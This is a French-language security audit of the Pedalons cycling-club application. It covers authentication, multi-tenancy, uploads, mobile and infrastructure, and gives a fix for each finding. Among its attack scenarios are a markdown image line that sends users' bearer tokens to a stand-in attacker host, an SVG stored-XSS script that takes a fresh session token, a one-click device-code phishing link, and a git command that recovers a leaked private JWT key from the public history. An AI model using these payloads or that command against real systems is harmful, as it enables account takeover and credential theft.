# Audit de sécurité Pedalons — septembre 2026

- **Révision auditée** : `0a4c211a` (develop, arbre propre)
- **Méthode** : revue statique du code source, sans rien exécuter (ni build, ni test, ni sonde réseau). Cinq revues parallèles par domaine :
  - authentification et sessions ;
  - autorisation et multi-tenant ;
  - entrées, fichiers, SSRF et injection ;
  - frontend web ;
  - mobile, appareils, infrastructure et supply chain.
- **Contre-vérification** : les constats Élevés et la plupart des Moyens ont été relus dans le code par l'auditeur principal.
- **Hors périmètre** :
  - la configuration du Caddy de l'hôte ;
  - les clés et le `.env` de production ;
  - les données migrées de biketeam.

  Les points qui en dépendent sont rangés dans la section « À valider ».
- **Couverture** : ce passage n'est pas exhaustif. Les modules Karoo et Garmin, et les dépendances tierces (CVE), n'ont eu qu'une revue légère.

> Le dépôt est **public** (vérifié avec `gh repo view`). L'historique Git fait donc partie de la surface d'attaque.

## Synthèse

| # | Sévérité | Constat | Composant |
|---|---|---|---|
| H1 | **Élevée** | Le code OTP à 6 chiffres se brute-force sans limite : prise de compte, admin plateforme compris | backend auth |
| H2 | **Élevée** | Un SVG ou XML téléversé est servi `inline` sur l'origine de l'app : XSS stockée, puis vol de session | backend assets |
| H3 | **Élevée** | `/karoo?code=…` et `/garmin?code=…` approuvent un appareil sans confirmation : phishing device-code en un clic | frontend + mobile |
| H4 | **Élevée** | L'app mobile envoie son `Authorization: Bearer` à toute URL d'image présente dans du markdown | mobile |
| M1 | Moyenne (élevée en chaîne) | L'access token n'est pas lié à son domaine : l'utilisateur est résolu par e-mail sur le Host de la requête | backend sécurité |
| M2 | Moyenne | Le filtre de proximité des annonces mesure la distance à la position exacte : le flou d'~1 km se contourne par multilatération | backend annonces |
| M3 | Moyenne | Le rééchantillonnage GPX à 10 m n'est pas borné : quelques Ko provoquent un OOM de la JVM partagée | backend GPX |
| M4 | Moyenne | Aucune limitation de débit ni verrouillage sur `/api/auth/login` | backend auth |
| M5 | Moyenne | Un lien de vérification d'e-mail connecte silencieusement la victime au compte de l'attaquant (login CSRF) | mobile + backend |
| M6 | Moyenne | ReDoS possible sur le markdown, dont la taille n'est pas bornée | backend assets |
| L1–L12 | Faible | Voir la section dédiée | divers |
| V1–V8 | À valider | Faits hors du dépôt, dont la clé JWT présente dans l'historique public | infra |

**Ordre de correction conseillé** :
1. H1, H2, H3 et H4 : petits correctifs locaux et fort impact.
2. Vérifier V1, la clé JWT de production.
3. M1, parce qu'il amplifie tout vol de compte sur plusieurs tenants.
4. M3 et M4.

---

## Constats de sévérité élevée

### H1 — Brute-force illimité du code OTP

- **Acteur** : anonyme qui connaît l'e-mail d'un utilisateur vérifié.
- **Preuve** : `backend/src/main/java/fr/pedalons/service/auth/AuthService.java:278-291`
  ```java
  AuthToken authToken = authTokenRepository.findValidByEmailAndType(email, AuthTokenType.OTP, domainId)...
  if (!MessageDigest.isEqual(...)) {
    throw new BadRequestException(ErrorCode.TOKEN_INVALID);   // aucun compteur, token toujours valide
  }
  ```
  - Le code a 6 chiffres (`common/TokenUtils.java:38-40`) et reste valide 5 minutes.
  - `otpMaxAttempts` ne limite que le nombre d'*envois* de code, jamais le nombre de *vérifications*.
  - Rien ne limite le débit : ni dans le code, ni dans les labels Traefik (`docker-compose.yml`).
- **Scénario** : l'attaquant envoie des tentatives en parallèle sur `POST /api/auth/otp/verify`.
  - À environ 500 requêtes/s, chaque fenêtre de 5 minutes donne à peu près 15 % de chances de trouver le code.
  - On peut redemander 3 codes par fenêtre, donc la probabilité dépasse 80 % en une heure.
  - L'admin plateforme créé au bootstrap se connecte par OTP (`BootstrapService.java:85-94`). La prise de ce compte donne accès à tous les tenants.
- **Correctif minimal** :
  - Ajouter une colonne `failed_attempts` sur `auth_tokens`, incrémentée dans une transaction `REQUIRES_NEW`. Sans cela, le rollback déclenché par l'exception annule l'incrément.
  - Invalider le token à `otpMaxAttempts` échecs.
  - En défense en profondeur, ajouter un middleware Traefik `ratelimit` sur `/api/auth/*`.
- **Test de régression** : quatre codes faux, puis le bon code, doivent donner `TOKEN_INVALID`.

### H2 — XSS stockée via un SVG ou un XML téléversé

- **Acteur** : tout membre d'une équipe. `AssetAccessChecker` accorde `CREATE` dès que l'utilisateur a un rôle dans l'équipe.
- **Preuve** :
  - `infrastructure/filetype/FileTypeCategory.java:25` : `IMAGE(Set.of(..., "svg"))`. La liste d'exclusion d'`ATTACHMENT` bloque `html` mais ni `svg` ni `xml`.
  - `FileTypeDetector.java:47-50` : `svg` est servi en `image/svg+xml`, `xml` en `application/xml`.
  - `api/assets/AbstractDownloadAssetResource.java:31-33` :
    ```java
    return Response.ok(downloadableAsset.content())
        .type(downloadableAsset.contentType())
        .header("Content-Disposition", "inline")
    ```
    Cette route est `@PermitAll` et servie sur **le même host** que la SPA (`/api`).
  - Aucun en-tête `X-Content-Type-Options` ni `Content-Security-Policy` n'est posé dans le dépôt : ni backend, ni `frontend/server.js`, ni Traefik.
- **Scénario** :
  1. L'attaquant attache `x.svg` à un post, avec un script du type `fetch('/api/auth/refresh',{method:'POST',credentials:'include'})`.
  2. Un utilisateur connecté clique sur la pièce jointe (`MediaDisplay.tsx:39`, `target="_blank"`).
  3. Le cookie de refresh (`Path=/`, `SameSite=Lax`) part avec la requête, car elle vient de la même origine, et `CrossSiteRequestFilter` la laisse passer.
  4. Le script récupère un access token frais : prise de compte, y compris celle d'un admin plateforme.
- **Correctif minimal** :
  - Dans `downloadAsset`, tout ce qui n'est pas png, jpeg, gif, webp ou pdf part en `Content-Disposition: attachment`, avec `X-Content-Type-Options: nosniff` et `Content-Security-Policy: default-src 'none'; sandbox`.
  - Retirer `svg` d'`IMAGE`, ou ne le servir que rastérisé par imgproxy.
  - Ajouter `svg` et `xml` à la liste d'exclusion d'`ATTACHMENT`.

### H3 — Approbation device-code sans confirmation

- **Acteur** : anonyme. `POST /api/device/oauth/device` est `@PermitAll`.
- **Preuve** :
  - Web : `frontend/src/pages/device/DeviceVerifyPage.tsx:82-88`
    ```ts
    // Auto-complete authorization when code is valid (user is already authenticated)
    if (user && codeValid && !completed && !hasInitiatedComplete.current) { ... completeAuthorization() }
    ```
  - Mobile : `mobile/lib/features/device/presentation/pages/device_verify_page.dart:34-37` appelle `_verifyCode` dès `initState`, puis `_completeAuthorization` si le code n'est pas encore autorisé.
    - `/karoo` et `/garmin` sont des App Links vérifiés (`contracts/routes.yaml:93-106`).
    - Un lien vers le même host dans n'importe quel markdown s'ouvre dans l'app (`core/utils/link_launcher.dart`).
  - Le token émis a le rôle `user` complet et un refresh token de 90 jours (`DeviceJwtService.java:20-41`). La claim `client` n'est lue nulle part.
- **Scénario** :
  1. L'attaquant démarre un flux device et obtient un `user_code`.
  2. Il envoie `https://www.pedalons.fr/karoo?code=ABC234` par mail, en message ou dans un commentaire d'équipe.
  3. La victime connectée ouvre le lien, et l'appareil est autorisé sans aucun clic.
  4. Le polling de l'attaquant sur `/token` récupère alors une paire de tokens valable 90 jours.
- **Correctif minimal** (web et mobile) :
  - Ne jamais approuver automatiquement.
  - Pré-remplir le code et afficher « Autoriser {client} sur le compte {nom} ? » avec un bouton explicite (RFC 8628 §5.4).

### H4 — Fuite du bearer token mobile vers des hôtes tiers

- **Acteur** : tout membre qui peut écrire du markdown (commentaire, post, annonce, sortie, page d'équipe).
- **Preuve** :
  - `mobile/lib/core/widgets/authenticated_image.dart:11-16` : `_resolveUrl` ne préfixe que les URL relatives et laisse passer les URL absolues telles quelles.
  - Lignes 76, 138 et 177 : `httpHeaders: {'Authorization': 'Bearer $token'}`, quel que soit l'hôte.
  - `core/pdl/pdl_markdown_body.dart:176-184` : toute image markdown passe par `AuthenticatedImage`.
- **Scénario** : `![x](https://evil.example/p.png)` dans un commentaire. Chaque utilisateur mobile qui ouvre le fil envoie son access token à `evil.example`. L'attaquant obtient un flux continu de tokens rejouables, dont ceux des admins qui lisent le fil.
- **Correctif minimal** : n'ajouter l'en-tête que si `Uri.parse(url).host == Uri.parse(AppConfig.apiBaseUrl).host`.

---

## Constats de sévérité moyenne

### M1 — L'access token n'est pas lié à son tenant

- **Preuve** : `service/security/PedalonsQueryContext.java:155-169`
  ```java
  String email = jwt.getClaim("email");
  if (domain == null) { /* domainId de la claim, seulement si le Host ne résout rien */ }
  if (domain != null) {
    user = userService.lookupUserByEmailAndDomain(domain.getId(), email).orElse(null);
  ```
  - Les claims `domainId` et `userId` sont ignorées dès que le Host résout un domaine.
  - Une seule clé de signature sert à tous les tenants.
  - Les chemins cookie de refresh et tile token vérifient bien le domaine (L198, L220-230). Le chemin JWT ne le fait pas.
- **Scénario** : un token émis sur le domaine A pour l'e-mail E est accepté sur le domaine B, où il agit en tant que le compte B de E, qui est un compte distinct.
- **Exploitation concrète** : elle suppose de détenir sur A un compte dont on ne possède pas l'e-mail.
  - La connexion Strava n'exige pas d'e-mail vérifié (`StravaAuthService.java:187-218`).
  - La migration biketeam importe des e-mails non vérifiés en y rattachant un `strava_id` (`BiketeamMigrationService.java:694-708`).

  Par ailleurs, une révocation sur B (déconnexion globale, reset, suppression) reste sans effet sur un token émis par A.
- **Correctif minimal** : dans `doInit`, rejeter le JWT si `domainId` diffère du domaine résolu, et charger l'utilisateur par la claim `userId` en le restreignant à ce domaine. Ajouter un test qui rejoue un token de A contre B.

### M2 — Le filtre de proximité des annonces contourne le flou d'~1 km

- **Preuve** :
  - `repository/ad/AdRepository.java:106-116` : `st_distancesphere(te.locationGeometry, :nearPoint) <= :nearRadius`.
  - `locationGeometry` contient la position **exacte** (`AdService.java:325`) ; seul le DTO la floute (`AdDto.java:113`).
  - Quantifier la sonde et le rayon ne suffit pas. Chaque réponse indique si `dist(exact, centre_de_cellule) <= k·cellule`, et en combinant des centres à différentes distances, ces cercles découpent la cellule plus finement que sa taille.
  - Le commentaire « every reachable query is one the published data already answers » est donc faux.
- **Acteur** : membre d'une équipe où les annonces sont activées, avec quelques centaines de requêtes `GET /api/teams/{slug}/ads?nearLat=…`.
- **Conséquence** : l'invariant de `CLAUDE.md` (« un secteur, jamais un point ») est cassé.
- **Correctif minimal** : filtrer sur la position floutée, par exemple avec une colonne `coarse_location` remplie par `CoarseLocation.blur()` à l'écriture.
- **Point annexe** : `getDtoEdit` renvoie la position exacte à tout admin d'équipe, et pas seulement au propriétaire, contrairement à ce que dit la doc du schéma `AdDto`.

### M3 — DoS mémoire par rééchantillonnage GPX non borné

- **Preuve** :
  - `service/route/GpxProcessingService.java:191` : `computeOnePointPerDistance(path, 10.0)` interpole `ceil(dist/10 m)` points par segment, sans plafond.
  - `GeoPoint` ne borne ni la latitude ni la longitude.
  - `GpxPreviewFromPointsRequest.points` n'a pas de `@Size`.
  - Le PUT de preview (`GpxPreviewResource.java:254`) et `RouteResource.java:224,409` n'appliquent pas la limite de 10 Mo.
- **Scénario** : un utilisateur authentifié envoie des points qui alternent entre (0,0) et (0,179). Chaque segment fait environ 19 900 km, soit environ 2 millions de points, et 1 000 segments suffisent pour un OOM. Le backend unique, partagé par tous les tenants, tombe.
- **Correctif minimal** :
  - Plafonner la distance totale, ou le nombre de points après rééchantillonnage, avant l'appel.
  - Ajouter `@Size(max=…)` et une validation des bornes lat/lng.
  - Appliquer `MAX_GPX_SIZE_BYTES` sur toutes les routes d'import.

### M4 — Pas de throttling sur la connexion par mot de passe

- **Preuve** : `AuthService.java:305-327`. Aucun compteur, délai ou verrouillage. Le minimum est de 8 caractères.
- **Conséquences** :
  - Credential stuffing et devinette en ligne.
  - Chaque essai déclenche un bcrypt côté serveur, ce qui en fait un levier de charge CPU bon marché.
- **Correctif** : le même rate-limit que pour H1, plus une temporisation par compte.

### M5 — Login CSRF via le lien de vérification d'e-mail

- **Preuve** :
  - `mobile/lib/features/auth/presentation/pages/verify_email_page.dart:27-43` appelle `verifyEmail` dans `initState`.
  - `_handleAuthSuccess` remplace alors la session en cours.
  - Côté backend, `AuthService.verifyEmail` ouvre une session (L147).
  - La route est un deeplink (`routes.yaml:46-52`), et la page propose ensuite d'enregistrer une passkey.
- **Scénario** :
  1. L'attaquant s'inscrit avec son propre e-mail et envoie son lien de vérification, non consommé, à la victime.
  2. La victime se retrouve connectée au compte de l'attaquant.
  3. Elle peut y enregistrer sa passkey, et y saisit ensuite ses sorties et ses connexions GPS.
- **Correctif** : si une session existe déjà, demander confirmation avant de changer de compte. Idéalement, la vérification marque seulement l'adresse comme vérifiée, sans ouvrir de session.

### M6 — ReDoS sur le markdown non borné

- **Preuve** :
  - `service/asset/AssetService.java:54-55` : `::asset\{[^}]*id="([^"]+)"[^}]*\}`, appliqué à chaque `updateAssets`.
  - `MediaDto.markdown` n'a pas de `@Size`, et la limite de corps de requête est de 100 Mo.
- **Scénario** : une répétition de `::asset{id="a"` sans `}` donne un backtracking polynomial qui bloque un worker. La complexité est déduite du motif, pas mesurée.
- **Correctif** : `@Size(max = 100_000)` sur `markdown`, et le motif possessif `::asset\{([^}]*+)\}` suivi d'une extraction séparée de `id`.

---

## Constats de sévérité faible

| # | Constat | Preuve | Correctif |
|---|---|---|---|
| L1 | Réinitialiser le mot de passe ne révoque pas les sessions existantes (refresh token de 30 j, 90 j pour un appareil) | `AuthService.java:391-401` | `authSessionRepository.revokeAllByUserId(...)` dans `resetPassword` |
| L2 | L'état OAuth Strava n'est pas lié au navigateur qui a lancé le flux (CSRF de liaison et de login) | `StravaAuthService.java:105-160` | Cookie HttpOnly court contenant le hash du `state` |
| L3 | Énumération des comptes : `EMAIL_ALREADY_EXISTS` à l'inscription, `allowCredentials` des passkeys, différence de temps liée au bcrypt | `AuthService.java:79-81,310-323`, `PasskeyService.java:248-266` | Réponse uniforme et bcrypt factice |
| L4 | Pré-inscription : le mot de passe choisi par celui qui s'inscrit est conservé après vérification par la victime | `AuthService.java:75-147` | Demander le mot de passe après la vérification |
| L5 | Lecture d'asset inter-domaines si l'attaquant reproduit les slugs d'équipe et d'entité ; `getAsset` fait un `findByIdOptional` sans filtre | `AssetAccessChecker.java:48-62`, `AssetService.java:263-291` | Exiger `asset.team.domain == domaine courant` et `asset.team.slug == teamSlug` |
| L6 | Un admin d'équipe peut ajouter un utilisateur d'un autre domaine (si `addMemberAllowed` est actif) | `TeamMembershipService.java:91-93` | `findActiveByIdAndDomain(...)` |
| L7 | SSR : `String.replace` avec une chaîne de remplacement interprète les `$\``, `$'` et `$&` du contenu utilisateur (défiguration de la page, pas de XSS repérée) | `frontend/server.js:156-160` | Utiliser un remplaçant fonction : `.replace(x, () => html)` |
| L8 | Paramètre `error` non encodé dans la redirection du callback GPS | `api/gps/GpsResource.java:100` | Le ramener à une clé fixe |
| L9 | Nom de fichier brut dans l'URL de téléchargement d'asset | `AssetService.java:331` | Encoder le segment |
| L10 | Karoo : tokens en clair dans DataStore avec `allowBackup="true"` | `karoo/app/src/main/AndroidManifest.xml:7`, `AuthManager.kt` | `allowBackup="false"` et chiffrement par Keystore |
| L11 | GitHub Actions : actions tierces épinglées par tag, pas de `permissions:` par défaut ; `karoo-release.yml` dispose du keystore | `.github/workflows/*.yml` | Épingler par SHA, `permissions: contents: read` |
| L12 | Dump biketeam écrit dans un `/tmp` prévisible sur un hôte partagé | `scripts/biketeam_fetch.sh:36,91` | `umask 077; mktemp -d` |

Informationnel :
- Le markdown web accepte des images externes (pistage de l'IP des lecteurs, sans fuite de token) : `MarkdownDisplay.tsx:70-72`.
- `GarminCourseConverter.java:30` utilise un `DocumentBuilderFactory` non durci. Ce n'est pas exploitable aujourd'hui, car l'entrée est toujours du GPX resérialisé.
- `?code=${userCode}` n'est pas encodé : `DeviceVerifyPage.tsx:49`.

---

## À valider : faits hors du dépôt

| # | Hypothèse | Fait manquant | Si elle est confirmée |
|---|---|---|---|
| V1 | **Une clé privée JWT figure dans l'historique public** : `git show c0ac99fe:backend/src/main/resources/privateKey.pem`, supprimée en `ab6385a8`, plus une clé de dev en `7978afb1`. La prod lit `/mnt/keys/*.pem`, générées par `data/keys/generate-keys.sh`. | Le SHA-256 de la `publicKey.pem` de prod, à comparer à celles de ces deux commits. Vérifier aussi que la clé de staging n'est pas une copie de celle de prod. | **Critique** : n'importe qui forge un JWT admin. Rotation immédiate. Dans tous les cas, considérer ces deux clés comme compromises. |
| V2 | La migration biketeam considère un `facebookId` ou `googleId` comme preuve de possession de l'e-mail, et copie `passwordHash`, nom et suppression sur un compte Pedalons existant (`BiketeamMigrationService.java:702-798`). | Biketeam laissait-il un compte Facebook ou Google changer d'e-mail sans le revérifier ? | Élevée : l'attaquant pose son mot de passe sur le compte vérifié de la victime. Correctif : ne se fier qu'à `emailVerified` et ne jamais écraser un compte antérieur à la migration. |
| V3 | Traefik tourne avec `forwardedHeaders.insecure=true` (`docker-compose.yml:17`), et `DomainResolver` fait confiance à `X-Forwarded-Host`. | Le Caddyfile de l'hôte : écrase-t-il `X-Forwarded-*` ? | Choix d'un tenant non routé publiquement, IP de session falsifiée. Remplacer par `trustedIPs`. |
| V4 | Le dépôt ne pose aucun en-tête de sécurité (CSP, `frame-ancestors`, `nosniff`, HSTS). | Le Caddy les ajoute-t-il ? | Clickjacking sur les actions sensibles, et H2 sans atténuation. Ajouter un middleware Traefik `headers`. |
| V5 | Sauvegardes : `rrsync <root>`, sans `-no-del`, accepte `--delete` et l'écriture en place. Les snapshots partagent des hardlinks et `SHA256SUMS` est stocké dans le snapshot lui-même. | La ligne `authorized_keys` exacte, et l'existence de snapshots en lecture seule côté hôte de sauvegarde. | Un root de prod peut effacer ou empoisonner tout l'historique de sauvegardes. |
| V6 | `CrossSiteRequestFilter` accepte `Sec-Fetch-Site: same-site` (`CrossSiteRequestFilter.java:80-83`). | Des tenants ou alias sont-ils des sous-domaines frères d'un même domaine enregistrable ? | CSRF entre tenants frères. |
| V7 | Le sujet des e-mails d'annonce contient `senderName` et `adName`, et tout part désormais en SMTP (relais Scaleway TEM). | Vert.x mail neutralise-t-il le CRLF ? | Injection d'en-têtes SMTP. |
| V8 | imgproxy sert des SVG via `/images/...`. | `IMGPROXY_SANITIZE_SVG` est-il actif ? (Il l'est par défaut dans les versions récentes.) | Variante de H2. |

---

## Contrôles vérifiés et conformes

- **Tokens** :
  - Refresh, vérification, reset, device et Strava : 32 octets `SecureRandom`, stockés hachés en SHA-256, à usage unique.
  - Access token de 15 min.
  - Clé de chiffrement AES-256-GCM sans valeur par défaut en prod.
  - Comparaison de l'OTP en temps constant.
- **WebAuthn** : challenge de 32 octets, 5 min, supprimé en `REQUIRES_NEW` ; origin et rpId issus du `Domain` stocké.
- **Liens des e-mails** : construits depuis `effectiveBaseUrl`, pas depuis le Host.
- **Autorisation** :
  - Chaque méthode de service appelée depuis `api/` porte `@CheckAccess`, `@Logged`, `@Public` ou `@Admin` (207 appels vérifiés).
  - `TeamEntityRepository.getPedalonsQuery` filtre toujours par domaine.
  - Pas d'assignation de masse de `role`, `domainId`, `teamId` ou `createdBy`.
- **Invariants de `CLAUDE.md`** : `RideGroupDto.leader` ne retombe jamais sur `createdBy`. `AdDto` floute la position et ne porte aucun contact (le relais e-mail est rate-limité). Seul le filtre de proximité fait exception, voir M2.
- **Parsing** :
  - gpx2web 1.4.5 durci contre XXE et billion laughs.
  - Clés S3 dérivées de TSID ou UUID, sans path traversal.
  - Aucun fetch d'URL fournie par un utilisateur (pas de SSRF).
  - HQL entièrement paramétré, tris par enum.
  - ICS correctement échappé.
  - Pas de stack trace renvoyée au client.
- **Frontend** :
  - Aucun `dangerouslySetInnerHTML`, `innerHTML` ou `eval`.
  - `react-markdown` sans `rehype-raw`.
  - Access token en mémoire ; refresh token en cookie HttpOnly, Secure, Lax.
  - JSON SSR échappé.
  - Pas d'open redirect.
  - Source maps désactivées en prod.
- **Mobile** :
  - Refresh token dans `flutter_secure_storage`.
  - Aucun `badCertificateCallback`, aucune WebView.
  - Uniquement des App Links https vérifiés, sans scheme custom.
- **Infra** :
  - Postgres, Traefik, MailHog, MinIO et imgproxy exposés sur loopback uniquement.
  - Dashboard Traefik désactivé.
  - `.env` jamais versionné.
  - Staging des sauvegardes en `700`, restauration avec confirmation.
  - Aucun keystore, `.p8` ou `google-services.json` versionné.
